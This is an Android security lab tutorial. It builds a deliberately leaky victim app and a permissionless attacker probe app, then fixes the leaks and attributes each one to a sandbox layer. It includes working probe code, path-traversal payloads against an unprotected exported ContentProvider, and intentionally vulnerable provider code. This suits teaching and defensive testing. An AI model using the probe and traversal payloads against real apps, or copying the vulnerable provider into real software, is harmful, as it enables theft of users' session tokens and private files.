# Lab 03 — Write an Attacker App and Probe the Boundary

**Difficulty:** Intermediate
**Time:** 2–3 hours
**Prerequisites:** [Lab 01](lab-01-mapping-the-sandbox.md),
[Chapter 21 §3.14](../README.md#314-what-the-sandbox-does-not-protect-against) and
[§9.3](../README.md#93-advanced--the-attacker-app-and-what-it-can-actually-reach), Gradle + Android SDK,
a device or emulator you own.

---

## Objective

Build two applications. A **victim** that leaks in six distinct ways, and an **attacker** that declares
no dangerous permissions and systematically enumerates what it can reach of the victim. Find every
leak, close every leak, re-run, and confirm the attacker finds none.

Then — the part that matters — classify each leak by **which layer of the sandbox was involved**. In
every single case you will find that the sandbox held. The failures are all in what the developer
placed outside it, or in the doors the developer opened.

## Why this matters

This is the lab that establishes what the sandbox actually does, because it is the only experiment in
the chapter conducted from the correct vantage point.

> **Definition — `adb shell`**
> The interactive shell `adbd` provides. It runs as the Linux user `shell`, **UID 2000**, in the
> SELinux domain `shell`, with no seccomp filter, a non-empty capability bounding set, and a
> supplementary group list that includes privileges no application holds. It is **not** an app.

> **Warning**
> A component you reached with `am start`, `content query`, `service call` or `run-as` is **not**
> thereby proven reachable by an attacker. Reproducing the same operation from an ordinary installed
> app is a *different experiment* with a *different answer*, and only that second answer supports the
> sentence "any app the user installs can do this".

Almost every rejected Android finding is rejected for that reason. A developer replies, correctly,
that the tester demonstrated shell privilege rather than app reachability. The probe APK is how you
never have that conversation again — and it doubles as evidence a client engineer can install and run
themselves, which ends arguments about whether a finding is real.

> **Mental Model**
> The shell is a maintenance engineer with a master key. The probe APK is a member of the public. Both
> can walk up to the same door. Only one of them tells you whether the door is locked.

---

## Setup

Two Gradle projects. The runnable attacker sources are in
[`../examples/attacker-app/`](../examples/attacker-app/); the probe logic is
[`../examples/AttackerProbe.kt`](../examples/AttackerProbe.kt).

```bash
# host
mkdir -p sandbox-lab/victim sandbox-lab/attacker
```

Use `com.example.victim` and `com.attacker.sandboxprobe` as application IDs. Target SDK 34 for both, so
that scoped storage and package visibility filtering are in force — testing against a legacy target
would flatter your results.

> **Pentester's Note**
> Build the victim at `targetSdk 34` **and** at `targetSdk 28`, and run the attacker against both. Half
> the platform's mitigations are `targetSdk`-gated. A leak that is wide open against API 28 may be
> completely closed against API 34 with byte-identical source, and knowing which of your findings are
> version-conditional is the difference between a report that survives review and one that does not.

---

## Steps

### Step 1 — Build the victim, with six deliberate leaks

Each leak is a different *category* of mistake. Keep them separate so you can attribute results.

```kotlin
// victim: src/main/java/com/example/victim/VictimApp.kt
package com.example.victim

import android.app.Application
import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import java.io.File

class VictimApp : Application() {

    override fun onCreate() {
        super.onCreate()
        val token = "eyJhbGciOiJIUzI1NiJ9.SECRET-SESSION-TOKEN.sig"

        // LEAK 1 (control): correctly stored inside the sandbox.
        getSharedPreferences("secure", Context.MODE_PRIVATE)
            .edit().putString("session", token).apply()

        // LEAK 2: written to shared storage. This has LEFT the sandbox.
        runCatching {
            File(getExternalFilesDir(null)?.parentFile?.parentFile?.parentFile, "victim-debug.log")
                .appendText("session=$token\n")
        }

        // LEAK 3: written to a world-readable location inside our own tree using
        // the legacy mode constant. On modern targets this THROWS — which is
        // itself the result you want to observe.
        runCatching {
            openFileOutput("legacy.txt", Context.MODE_WORLD_READABLE)
                .use { it.write(token.toByteArray()) }
        }

        // LEAK 4: put on the clipboard "for convenience".
        runCatching {
            (getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager)
                .setPrimaryClip(ClipData.newPlainText("token", token))
        }

        // LEAK 5: logged.
        android.util.Log.d("VictimApp", "initialised with session=$token")

        // LEAK 6 is the exported provider below.
    }
}
```

```kotlin
// victim: src/main/java/com/example/victim/LeakyProvider.kt
package com.example.victim

import android.content.ContentProvider
import android.content.ContentValues
import android.database.Cursor
import android.database.MatrixCursor
import android.net.Uri
import android.os.ParcelFileDescriptor
import java.io.File

class LeakyProvider : ContentProvider() {

    override fun onCreate() = true

    /** LEAK 6a: hands out the session token to anyone who asks. */
    override fun query(uri: Uri, p: Array<String>?, s: String?,
                       sa: Array<String>?, so: String?): Cursor {
        val prefs = context!!.getSharedPreferences("secure", 0)
        return MatrixCursor(arrayOf("key", "value")).apply {
            addRow(arrayOf("session", prefs.getString("session", "")))
        }
    }

    /**
     * LEAK 6b: path traversal. The caller names a file; WE open it, with OUR
     * authority, and hand back a working descriptor.
     */
    override fun openFile(uri: Uri, mode: String): ParcelFileDescriptor {
        val name = uri.lastPathSegment ?: throw IllegalArgumentException("no segment")
        val f = File(context!!.filesDir, name)          // <-- no canonicalisation
        return ParcelFileDescriptor.open(f, ParcelFileDescriptor.MODE_READ_ONLY)
    }

    override fun getType(uri: Uri) = "vnd.android.cursor.dir/vnd.victim.item"
    override fun insert(uri: Uri, v: ContentValues?): Uri? = null
    override fun delete(uri: Uri, s: String?, sa: Array<String>?) = 0
    override fun update(uri: Uri, v: ContentValues?, s: String?, sa: Array<String>?) = 0
}
```

```xml
<!-- victim: AndroidManifest.xml -->
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.example.victim">

    <application
        android:name=".VictimApp"
        android:allowBackup="true"
        android:label="Victim">

        <!-- LEAK 6: exported, no permission attribute. -->
        <provider
            android:name=".LeakyProvider"
            android:authorities="com.example.victim.provider"
            android:exported="true" />

        <activity android:name=".MainActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>
```

Add a trivial `MainActivity` so the app can be launched.

**Question 1.** Before building: which of the six leaks do you expect the *sandbox itself* to prevent,
and which do you expect it to be entirely irrelevant to? Write your prediction down.

### Step 2 — Build the attacker, and get `<queries>` right first

This is the step that silently ruins the experiment if you skip it.

> **Definition — package visibility filtering**
> From `targetSdk` 30 (Android 11), an app can no longer see the full list of installed packages. It
> sees itself, a small set of always-visible system packages, packages it interacts with through
> certain APIs, and whatever it declares in a `<queries>` element.

```xml
<!-- attacker: AndroidManifest.xml -->
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.attacker.sandboxprobe">

    <!--
        The ONLY permission. INTERNET is protectionLevel="normal": granted
        silently at install, never shown to the user, held by essentially every
        app on every device. Everything else this probe does needs NO permission
        at all. That is the point.
    -->
    <uses-permission android:name="android.permission.INTERNET" />

    <!--
        DO NOT DELETE. Without this, the target is invisible and every symptom
        looks like absence rather than filtering.
    -->
    <queries>
        <package  android:name="com.example.victim" />
        <provider android:authorities="com.example.victim.provider" />
    </queries>

    <application android:label="Flashlight" android:allowBackup="false">
        <activity android:name=".ProbeActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>
```

Without the `<queries>` block, on a `targetSdk` 30+ probe:

| Symptom | Looks like | Actually is |
|---|---|---|
| `getPackageInfo()` throws `NameNotFoundException` | "not installed" | filtered |
| `resolveActivity()` returns `null` | "no such component" | filtered |
| `startActivity()` throws `ActivityNotFoundException` | "not reachable" | filtered |
| `query()` throws `IllegalArgumentException: Unknown URL` | "no such provider" | filtered |

**Question 2.** Build the attacker **once without** the `<queries>` block and run it. Record what you
see. Then add the block and re-run. What is the difference, and what would you have concluded from the
first run alone? Is package visibility filtering a security boundary?

### Step 3 — Write the probe with a five-verdict vocabulary

Do not print booleans. Every check gets one of five verdicts, because the difference between them is
the difference between a finding and an anecdote.

| Verdict | Meaning | What you may write in a report |
|---|---|---|
| `REACHABLE` | Succeeded from an ordinary app UID | "An unprivileged third-party application can…" — the strongest claim available without root |
| `DENIED` | The platform refused us (`SecurityException`, `EACCES`, `bindService` → `false`) | "Not reachable by a third-party application." Record it; ruling things out is part of the work |
| `ABSENT` | Does not exist **or** is filtered | Nothing, until you have re-checked `<queries>` |
| `ERROR` | The target accepted the request and then threw | **Still reachable.** The door opened; the room behind it was untidy. Often the most interesting result |
| `INCONCLUSIVE` | The API cannot tell us | Nothing. Go and get the missing evidence |

```kotlin
// attacker: src/main/java/com/attacker/sandboxprobe/Verdict.kt
package com.attacker.sandboxprobe

enum class V { REACHABLE, DENIED, ABSENT, ERROR, INCONCLUSIVE }

object Report {
    private val sb = StringBuilder()
    fun row(area: String, what: String, v: V, detail: String = "") {
        val line = "%-14s %-46s %-13s %s".format(area, what, v, detail)
        android.util.Log.w("SANDBOXPROBE", line)
        sb.appendLine(line)
    }
    fun section(t: String) { android.util.Log.w("SANDBOXPROBE", ""); android.util.Log.w("SANDBOXPROBE", "=== $t ===") }
    override fun toString() = sb.toString()
}
```

Now the probes. Each is independently guarded — never abort on the first denial.

```kotlin
// attacker: src/main/java/com/attacker/sandboxprobe/Probes.kt
package com.attacker.sandboxprobe

import android.content.ClipboardManager
import android.content.Context
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Process
import java.io.File

private const val TARGET = "com.example.victim"

fun probeIdentity(ctx: Context) {
    Report.section("0. WHO ARE WE")
    val uid = Process.myUid()
    Report.row("identity", "uid / appId", V.REACHABLE, "$uid / ${uid % 100_000}")
    Report.row("identity", "selinux", V.REACHABLE,
        runCatching { File("/proc/self/attr/current").readText().trim() }.getOrDefault("?"))
    Report.row("identity", "seccomp", V.REACHABLE,
        runCatching { File("/proc/self/status").readLines().first { it.startsWith("Seccomp:") } }
            .getOrDefault("?"))
    // Prove the target is visible to us BEFORE concluding anything is absent.
    val vis = runCatching { ctx.packageManager.getPackageInfo(TARGET, 0).applicationInfo.uid }
    Report.row("visibility", "target package visible", if (vis.isSuccess) V.REACHABLE else V.ABSENT,
        vis.getOrNull()?.let { "victim uid=$it" } ?: "CHECK <queries> BEFORE READING ANY OTHER ROW")
}

fun probePrivateData(ctx: Context) {
    Report.section("1. THE VICTIM'S PRIVATE DATA DIRECTORY")
    val ai = runCatching { ctx.packageManager.getApplicationInfo(TARGET, 0) }.getOrNull()
    if (ai == null) { Report.row("data", "applicationInfo", V.ABSENT); return }
    listOf(ai.dataDir,
           "${ai.dataDir}/shared_prefs",
           "${ai.dataDir}/shared_prefs/secure.xml",
           "${ai.dataDir}/databases",
           "${ai.dataDir}/files/legacy.txt").forEach { p ->
        val f = File(p)
        Report.row("data", p, if (f.canRead()) V.REACHABLE else V.DENIED,
            "exists=${f.exists()} read=${f.canRead()} list=${f.list()?.size ?: "null"}")
    }
}

fun probeApk(ctx: Context) {
    Report.section("2. THE VICTIM'S SHIPPED CODE")
    val ai = runCatching { ctx.packageManager.getApplicationInfo(TARGET, 0) }.getOrNull() ?: return
    val apk = File(ai.sourceDir)
    Report.row("apk", ai.sourceDir, if (apk.canRead()) V.REACHABLE else V.DENIED,
        "size=${runCatching { apk.length() }.getOrDefault(-1)}")
    Report.row("apk", ai.nativeLibraryDir, if (File(ai.nativeLibraryDir).canRead()) V.REACHABLE else V.DENIED)
}

fun probeProvider(ctx: Context) {
    Report.section("3. THE DOOR THE DEVELOPER OPENED")
    val base = Uri.parse("content://com.example.victim.provider")
    runCatching {
        ctx.contentResolver.query(base, null, null, null, null)?.use { c ->
            val rows = buildString {
                while (c.moveToNext()) append((0 until c.columnCount).joinToString(",") { c.getString(it) })
            }
            Report.row("provider", "query()", V.REACHABLE, rows.take(120))
        } ?: Report.row("provider", "query()", V.INCONCLUSIVE, "null cursor — path may not match UriMatcher")
    }.onFailure {
        val v = if (it is SecurityException) V.DENIED else V.ERROR
        Report.row("provider", "query()", v, "${it.javaClass.simpleName}: ${it.message}")
    }

    // Traversal against openFile().
    listOf("input.txt",
           "../shared_prefs/secure.xml",
           "../../../../data/data/com.example.victim/shared_prefs/secure.xml",
           "../databases/app.db").forEach { seg ->
        runCatching {
            ctx.contentResolver.openInputStream(Uri.withAppendedPath(base, seg))!!
                .bufferedReader().readText()
        }.onSuccess {
            Report.row("provider", "openFile($seg)", V.REACHABLE, it.take(100).replace("\n", " "))
        }.onFailure {
            val v = when (it) {
                is SecurityException -> V.DENIED
                is java.io.FileNotFoundException -> V.ABSENT
                else -> V.ERROR
            }
            Report.row("provider", "openFile($seg)", v, it.javaClass.simpleName)
        }
    }
}

fun probeSharedStorage(ctx: Context) {
    Report.section("4. WHAT THE VICTIM PUT OUTSIDE ITS SANDBOX")
    listOf("/storage/emulated/0",
           "/storage/emulated/0/Download",
           "/storage/emulated/0/victim-debug.log",
           "/storage/emulated/0/Android/data",
           "/storage/emulated/0/Android/data/com.example.victim").forEach { p ->
        val f = File(p)
        val v = when {
            !f.exists() -> V.ABSENT
            f.canRead() -> V.REACHABLE
            else -> V.DENIED
        }
        Report.row("storage", p, v,
            if (f.isFile && f.canRead()) runCatching { f.readText().take(80) }.getOrDefault("") else
                "entries=${f.list()?.size ?: "null"}")
    }
}

fun probeClipboard(ctx: Context) {
    Report.section("5. THE CLIPBOARD")
    runCatching {
        val cm = ctx.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        val clip = cm.primaryClip
        if (clip == null || clip.itemCount == 0)
            Report.row("clipboard", "primaryClip", V.ABSENT, "empty")
        else
            Report.row("clipboard", "primaryClip", V.REACHABLE,
                clip.getItemAt(0).coerceToText(ctx).toString().take(80))
    }.onFailure {
        Report.row("clipboard", "primaryClip", V.DENIED, it.javaClass.simpleName)
    }
}

fun probeProcess(ctx: Context) {
    Report.section("6. THE VICTIM'S PROCESS")
    val ai = runCatching { ctx.packageManager.getApplicationInfo(TARGET, 0) }.getOrNull()
    val visible = File("/proc").list { _, n -> n.all(Char::isDigit) } ?: emptyArray()
    Report.row("proc", "numeric /proc entries visible", V.REACHABLE, "${visible.size}")
    var foundVictim = V.ABSENT
    visible.forEach { pid ->
        runCatching {
            val cmd = File("/proc/$pid/cmdline").readText().trim('\u0000')
            if (cmd.startsWith(TARGET)) foundVictim = V.REACHABLE
        }
    }
    Report.row("proc", "victim process visible in /proc", foundVictim)
    Report.row("proc", "read victim /proc/<pid>/status", V.DENIED,
        "hidepid-equivalent since API 29")
    ai?.let { Report.row("proc", "ptrace victim", V.DENIED, "different UID + SELinux + Yama") }
}
```

Wire them up in `ProbeActivity.onCreate` and render the report to a selectable `TextView` as well as
`logcat`, so you can screenshot it for an appendix.

### Step 4 — Run the two experiments side by side

**Experiment A — from the shell (UID 2000):**

```bash
# adb shell
content query --uri content://com.example.victim.provider
cat /storage/emulated/0/victim-debug.log
cmd clipboard get-primary-clip 2>/dev/null || echo "not available on this build"
ls -la /data/data/com.example.victim
```

**Experiment B — from the probe APK (an ordinary app UID):**

```bash
# host
adb install -r attacker/build/outputs/apk/debug/attacker-debug.apk
adb logcat -c
adb shell am start -n com.attacker.sandboxprobe/.ProbeActivity
adb logcat -s SANDBOXPROBE:W
```

Record **both** columns. The table is the artefact:

| Thing | From `adb shell` | From the probe APK | Verdict |
|---|---|---|---|
| `/data/data/com.example.victim` | | | |
| The victim's `base.apk` | | | |
| `content://com.example.victim.provider` | | | |
| `openFile` with `../shared_prefs/secure.xml` | | | |
| `/storage/emulated/0/victim-debug.log` | | | |
| Clipboard | | | |
| Victim process in `/proc` | | | |

**Question 3.** Find at least one row where the two columns differ. Which is the honest one for a
report claiming "any installed app can…"? Explain the mechanism behind the difference.

**Question 4.** The provider `query()` came back `REACHABLE` and returned the session token. Which
layer of the sandbox failed? Answer carefully — the expected answer is "none of them".

### Step 5 — The leak the sandbox never sees

Look at the shared-storage row.

**Question 5.** The victim wrote `victim-debug.log` to shared storage. Is this readable by the attacker
at `targetSdk 34`? At `targetSdk 28`? What if the attacker holds `READ_EXTERNAL_STORAGE`? What if the
victim is uninstalled — does the file go away?

Now check the clipboard row.

**Question 6.** Your probe was in the foreground when it read the clipboard. Re-run the probe with the
app in the background (start it, press Home, then trigger the read from a `Handler` after a delay).
What changes, on which Android version, and why? What must you therefore state in a clipboard finding
for it to be credible?

### Step 6 — Exploit the traversal properly

The `openFile` probe with `../shared_prefs/secure.xml` should have returned `REACHABLE` with the
victim's actual XML.

**Question 7.** The attacker cannot open `/data/data/com.example.victim/shared_prefs/secure.xml`
directly — the DAC check refuses it, as row 1 of your table shows. Yet it just read the file's
contents. Explain *precisely* why, in terms of which process performed the `open()` and when the
kernel's permission check happened. Name the escape class from §3.15.

**Question 8.** Try to reach something *outside* the victim's data directory entirely, for example
`../../../../system/etc/hosts`. Does it work? Should it? What does the answer tell you about the real
scope of this bug class, and how should that change the severity you assign?

### Step 7 — Fix everything, then re-run

Apply each fix and re-run the probe after each one, so you attribute each disappearing row correctly.

```xml
<!-- FIX 6: the provider is not exported at all, and openFile is replaced. -->
<provider
    android:name="androidx.core.content.FileProvider"
    android:authorities="com.example.victim.fileprovider"
    android:exported="false"
    android:grantUriPermissions="true">
    <meta-data
        android:name="android.support.FILE_PROVIDER_PATHS"
        android:resource="@xml/provider_paths" />
</provider>
```

```xml
<!-- res/xml/provider_paths.xml — the allowlist. Nothing outside it is reachable. -->
<paths>
    <files-path name="exports" path="exports/" />
</paths>
```

If the provider genuinely must stay and serve files itself, canonicalise:

```kotlin
// The correct openFile. Canonicalise, then verify containment.
override fun openFile(uri: Uri, mode: String): ParcelFileDescriptor {
    val root = File(context!!.filesDir, "exports").canonicalFile
    val name = uri.lastPathSegment ?: throw FileNotFoundException("no segment")
    val target = File(root, name).canonicalFile
    if (!target.path.startsWith(root.path + File.separator))
        throw SecurityException("path escapes the export root")
    return ParcelFileDescriptor.open(target, ParcelFileDescriptor.MODE_READ_ONLY)
}
```

The other five fixes:

| Leak | Fix |
|---|---|
| 2 — shared storage | Write to `context.filesDir`. If the user must receive a file, use the Storage Access Framework (`ACTION_CREATE_DOCUMENT`) so the user chooses the destination |
| 3 — `MODE_WORLD_READABLE` | Delete it. It throws `SecurityException` on `targetSdk` ≥ 24 anyway; the finding is that the code path exists |
| 4 — clipboard | Do not put credentials on the clipboard. If a "copy" affordance is required, set `ClipDescription.EXTRA_IS_SENSITIVE` and clear it on a timer |
| 5 — logging | Strip logging in release with a ProGuard/R8 `assumenosideeffects` rule for `android.util.Log`, and never log credential material even in debug |
| — `allowBackup` | `android:allowBackup="false"`, or `android:dataExtractionRules` with explicit exclusions plus `getNoBackupFilesDir()` |

Re-run the probe. Every row in sections 1, 3, 4 and 5 should now be `DENIED` or `ABSENT`.

**Question 9.** One row will not change no matter what the victim does. Which one, and why is it not a
finding?

### Step 8 — Attribute every result to a layer

Complete this table. Be honest: most rows will say "not involved".

| Leak | Sandbox layer involved | Did the sandbox fail? | Real root cause |
|---|---|---|---|
| 1. Private prefs (control) | DAC + SELinux MCS | | |
| 2. Shared storage log | | | |
| 3. `MODE_WORLD_READABLE` | | | |
| 4. Clipboard | | | |
| 5. Logcat | | | |
| 6a. Exported provider query | | | |
| 6b. `openFile` traversal | | | |
| APK readability | | | |

**Question 10.** Write two sentences you would put at the top of the findings section of a report based
on this lab. One sentence about what the sandbox did. One about what it does not cover. Neither should
contain the phrase "the sandbox is broken".

---

## Hints

<details>
<summary>Hint 1 — everything comes back ABSENT</summary>

Read section 0 of the probe output first. That is what it is for. If "target package visible" is
`ABSENT`, your `<queries>` block is missing or wrong and **every other row is meaningless**. Providers
need a second entry by **authority**, not just by package:

```xml
<queries>
    <package  android:name="com.example.victim" />
    <provider android:authorities="com.example.victim.provider" />
</queries>
```

Harvest real authorities from the target's manifest:

```bash
# host
apktool d -f victim.apk -o work/ >/dev/null
grep -oE 'android:authorities="[^"]*"' work/AndroidManifest.xml
```
</details>

<details>
<summary>Hint 2 — the provider query returns a null cursor rather than throwing</summary>

`null` is not a denial. A provider commonly returns `null` because the URI path did not match its
`UriMatcher`, not because it refused you. That is why the vocabulary has `INCONCLUSIVE`.

Try more paths, and get the real ones out of the decompiled provider:

```bash
# host
jadx -d out victim.apk
grep -rn 'addURI' out/sources/
```

See [27-ContentProviders](../../27-ContentProviders/README.md).
</details>

<details>
<summary>Hint 3 — the traversal returns FileNotFoundException</summary>

Three things to check. First, that the file you are aiming at exists — run the victim first so it
writes its prefs. Second, that you have the right number of `../` segments; count from `filesDir`, not
from the data directory root. Third, that `Uri.withAppendedPath` has not normalised your path — build
the URI from a string and check what actually arrives:

```kotlin
Uri.parse("content://com.example.victim.provider/" + "../shared_prefs/secure.xml")
```

Log the `uri.lastPathSegment` inside the victim's `openFile` to see exactly what it received.
</details>

<details>
<summary>Hint 4 — <code>/storage/emulated/0/victim-debug.log</code> is not there</summary>

On `targetSdk` 29+ the victim's write to the root of shared storage probably failed. That is scoped
storage working, and it is a result: note it, and then re-test with the victim built at `targetSdk 28`
plus `android:requestLegacyExternalStorage="true"` to see the pre-scoped-storage behaviour. Comparing
the two builds is the most instructive part of this step.
</details>

<details>
<summary>Hint 5 — you want to prove the probe really has no privilege</summary>

Have the probe print its own `/proc/self/status` (section 0 already does). You should see
`Seccomp: 2`, `NoNewPrivs: 1`, all-zero `Cap*` lines, and a `u:r:untrusted_app_34:s0:c…` context —
i.e. exactly the constraints of any app the user installs, and nothing like your shell. Paste that
block at the top of the evidence appendix. It is what makes the rest of the output mean something.
</details>

---

## Solution

<details>
<summary>Answers</summary>

**1.** The sandbox prevents exactly one of the six: leak 1, the correctly-stored preference, is
unreadable by the attacker. Leak 3 is prevented by a *different* mechanism (an API-level restriction
that throws), not by the sandbox. Leaks 2, 4, 5 and 6 are entirely outside the sandbox's remit: shared
storage is shared by definition, the clipboard is a system-wide buffer by design, the log is a shared
system service, and the provider is a door the developer opened deliberately.

**2.** Without `<queries>`, `getPackageInfo` throws `NameNotFoundException` and the provider query
throws `IllegalArgumentException: Unknown URL`. Every row reads `ABSENT`. From that run alone you would
have concluded "the victim is not installed" or "no exported components are reachable from a
third-party app" — a false negative produced by your own manifest, and a genuinely common reporting
error.

Package visibility filtering is **not** a security boundary. It is a privacy control. It never makes an
exported component unreachable; a real attacker declares the target in `<queries>`, or holds
`QUERY_ALL_PACKAGES`. It only hides things from apps that did not ask.

**3.** The rows that differ are typically `/data/data/com.example.victim` (the shell may list it with
root or on a `userdebug` build; the app never can) and anything reachable through shell-only tooling.
The probe APK column is the honest one for a claim about apps, because the probe holds exactly the
privileges any installed app holds: UID in the 10000+ range, `untrusted_app` domain, `Seccomp: 2`,
empty capabilities, one silently-granted `normal` permission. The shell holds UID 2000 in the `shell`
domain with none of those constraints.

**4.** None of them. The provider was declared `android:exported="true"` with no `permission`,
`readPermission` or signature check, so the platform did exactly what it was told: it let any app
query it. Every layer of the sandbox functioned correctly and irrelevantly. The finding is an
application configuration finding, and it should be written as one — "the application exposes an
unprotected `ContentProvider` that returns the current session token to any installed application",
not "the sandbox failed".

**5.** At `targetSdk 34` the victim's write to the root of shared storage will most likely have failed
outright, so the file does not exist — scoped storage prevented the leak at the source. At
`targetSdk 28` (or 29 with `requestLegacyExternalStorage`) it succeeds, and the attacker can read it:
at API ≤ 28 with `READ_EXTERNAL_STORAGE`, and at API 29+ the file is visible through `MediaStore`
depending on type and location. `READ_EXTERNAL_STORAGE` broadens what the attacker sees but is a
`dangerous` permission requiring a user prompt, which raises the attacker's cost and must be stated in
the finding.

And no — the file does **not** go away when the victim is uninstalled. Files outside an app's
app-specific directories survive uninstall. That is the real point: data written to shared storage has
left the sandbox *permanently*, and can be inherited by an app that later receives the recycled appId.

**6.** Since Android 10 (API 29), an app can only read the clipboard when it holds input focus or is the
default IME. A background read returns `null`. Android 12 shows a user-visible toast when an app reads
clipboard content it did not write, and Android 13 auto-clears sensitive clip data after a period.

So a clipboard finding must state **the Android version, the app state required, and the user
interaction required**. "Any app can steal the clipboard" was true in 2018 and is not true now. What is
still true and still worth reporting is the victim's side: putting a credential on a system-wide shared
buffer at all, without `ClipDescription.EXTRA_IS_SENSITIVE`, is the defect.

**7.** The attacker never opened the file. It asked the *provider* to open it. `ParcelFileDescriptor.open()`
ran inside the victim's process, as the victim's UID, in the victim's SELinux context, with full access
to the victim's own data directory — so the kernel's DAC and SELinux checks both passed, correctly, at
that moment. The resulting open file description was then transferred back across the Binder
transaction as a file descriptor.

The kernel checks permissions at `open()` time, in the opening process, and **never rechecks them for
subsequent reads through that descriptor**. The attacker holds access that was already granted.

This is §3.15 **Class 5 — file-descriptor leaks across the boundary**. It is the same mechanism that
makes descriptor passing to an isolated process work in [Lab 02](lab-02-isolated-process.md); used
deliberately it is a feature, used carelessly it is arbitrary file read as the target app.

**8.** It works for any file the *victim's* UID and SELinux context can read — so `/system/etc/hosts`
(world-readable, and `untrusted_app` may read `system_file`) will typically succeed, while another
app's private data will not, because the victim cannot read that either.

That bounds the severity precisely: the bug grants the attacker **the victim's read authority**, not
root and not arbitrary system access. So the severity depends on what the victim itself can read — its
own databases, its own token store, its own keys. Saying "arbitrary file read" without that
qualification overstates it; saying "reads any file the target application can read, including its
credential store" is accurate and is what a developer can act on.

**9.** The victim's `base.apk`. It is mode `0644` owned by `system` and `PackageManager` hands out its
path to any app permitted to see the package. Nothing the victim's developer can do changes that; it is
the platform's design.

It is not a finding on its own — but it is the reason a *related* finding matters: anything shipped
inside the APK (a `BuildConfig` field, a string resource, an asset, a bundled `.so`) is published to
every user and every app on the device. So "the APK is readable" is context, and "an API key is
compiled into the APK" is the finding.

**10.** Something close to:

> "The Android application sandbox performed correctly throughout this assessment: no test was able to
> read the application's private data directory, observe its process, or influence its execution from
> an unprivileged third-party application. Every finding below concerns data the application placed
> *outside* that boundary — on shared storage, on the clipboard, in the system log — or interfaces it
> deliberately exposed to other applications, none of which the sandbox was designed to protect."

</details>

---

## Success criteria

- [ ] The attacker app declares no `dangerous` permissions and only `INTERNET`
- [ ] Section 0 of the probe output proves its identity: app-range UID, `untrusted_app` context,
      `Seccomp: 2`, all-zero capabilities
- [ ] You ran the probe once **without** `<queries>` and can describe the false negative it produced
- [ ] Every check reports one of the five verdicts; no check aborts the run
- [ ] You produced the two-column table comparing `adb shell` against the probe APK, and identified at
      least one row where they differ
- [ ] The attacker found all six deliberate leaks (or explained why a leak did not occur at the target
      SDK level you built)
- [ ] You exploited the `openFile` traversal and can explain it in terms of *when* the kernel checks
      permissions
- [ ] You bounded the traversal's severity by testing what it can and cannot reach
- [ ] After the fixes, the attacker finds nothing except the APK
- [ ] You completed the attribution table, and most rows say the sandbox was not involved
- [ ] You can state, without hedging, why an `adb shell` result does not support a claim about apps
